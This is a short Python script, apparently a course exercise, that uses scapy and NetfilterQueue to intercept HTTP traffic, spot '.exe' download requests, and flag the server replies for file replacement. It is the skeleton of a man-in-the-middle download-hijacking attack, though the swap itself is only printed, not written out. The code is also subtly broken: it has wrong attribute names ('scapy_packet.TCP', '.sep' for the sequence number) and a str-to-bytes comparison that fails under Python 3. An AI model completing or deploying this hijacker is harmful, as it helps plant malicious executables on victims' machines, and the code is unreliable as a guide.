#! /usr/bin/python3

# scapy lets us probe, scan or attack networks.
import scapy.all as scapy
# NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
# Packets so matched can be accepted, dropped, altered, or given a mark.
import netfilterqueue

# List that contain the numbers of the TCP layer
ack_list = []

# Function that allow to intercept files that are going to be downloaded and then replace it
def process_packet(packet):
    # Converting packets in scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if there is Raw layer in the packet
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the TCP port is HTTP(port 80)
        if scapy_packet[scapy.TCP].dport == 80:
            # Check if there is a file to be downloaded in the layer
            if '.exe' in scapy_packet[scapy.Raw].load:
                # Print info that there is a .exe request
                print('[+] exe Request')
                # Append the number of the ack in the TCP layer to the list
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        # Check if the TCP port is HTTP(port 80)
        elif scapy_packet[scapy_packet.TCP].sport == 80:
            # check if the sep number is the same as the ack number
            if scapy_packet[scapy_packet.TCP].sep in ack_list:
                # Replace file and let the user know
                print('[+] Replacing file...')
                print(scapy_packet.show())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


